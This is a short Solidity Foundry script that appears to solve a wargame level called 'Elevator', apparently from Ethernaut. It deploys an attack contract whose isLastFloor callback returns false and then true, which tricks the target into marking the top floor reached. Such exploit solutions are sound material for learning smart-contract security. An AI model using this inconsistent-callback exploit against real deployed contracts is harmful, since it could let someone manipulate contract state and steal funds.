


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level11.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";



contract Attack {
    
    bool mySwitch;
    Elevator public elevatorInstance = Elevator(0xA93F4EE7dB25252febD6Ac7B1Fa1040EBFB54bC2);


    function gogo() public{
        elevatorInstance.goTo(0);
    }

     function isLastFloor(uint256) external returns (bool){
        if(!mySwitch){
            mySwitch = true;
            return false;
        }else{
            return true;
        }
     }
}

contract ElevatorSolution is Script {


    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attackCont = new Attack();
        attackCont.gogo();
        vm.stopBroadcast();
    }
}